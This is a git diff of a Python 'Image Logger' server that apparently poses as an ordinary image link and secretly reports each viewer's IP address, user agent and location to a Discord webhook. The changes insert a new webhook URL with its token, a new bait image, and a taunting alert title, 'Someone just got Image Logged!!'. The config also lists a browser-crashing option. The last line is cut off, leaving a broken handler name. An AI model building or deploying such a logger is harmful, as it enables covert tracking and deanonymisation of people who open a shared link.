@@ -1,4 +1,4 @@
-## by luakiller
+## by p1rate_00 & luakiller
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -11,14 +11,14 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1129733322092859393/Wy32g2UfH1VPKkaTRVQLyJOree1z42zrd2Gd3WSxU2LA5nqqLLz5BtnKTX1CAiaNf2r_",
-    "image": "https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/4/8/048a41b5bbd9413f3de6e4c0883bb31c9b2ccd46.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1129818273819676792/CWVTF90NaVzI4t5zN9qJFEsQ1fFyDpfEn1zFIIpIq4SbuAgZPVQ4bYe3kEW5tlaKDmbN",
+    "image": "https://i.ibb.co/vzs3GSH/Screenshot-20230715-183434-You-Tube.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x808080, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -36,7 +36,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -143,9 +143,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Image Logger",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Someone just got Image Logged!!**
 
 **Endpoint:** `{endpoint}`
             
@@ -300,4 +300,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+handler = ImageLoggerAP
